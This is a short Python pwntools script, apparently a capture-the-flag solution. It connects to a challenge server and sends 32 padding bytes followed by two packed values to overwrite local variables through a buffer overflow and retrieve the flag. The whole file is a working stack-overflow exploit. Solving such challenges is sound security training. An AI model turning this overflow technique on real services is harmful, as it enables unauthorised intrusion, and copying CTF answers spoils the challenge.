from pwn import *

# Connection details
HOST = "chals1.apoorvctf.xyz"
PORT = 3002

# Establish remote connection
conn = remote(HOST, PORT)

# Wait for the prompt (adjust as needed)
conn.recvuntil(b"what will it be this time?'\n")

# Construct the payload:
# 32 bytes to fill the buffer, then:
# p32(0xdecafbad) -> overwrites local_14
# p32(0xc0ff33)  -> overwrites local_10
payload = b"A" * 32
payload += p32(0xdecafbad)  # Overwrite local_14
payload += p32(0xc0ff33)    # Overwrite local_10

# Send the payload
conn.sendline(payload)

# Receive and print the response (the flag should be in the output)
response = conn.recvall().decode()
print(response)

conn.close()
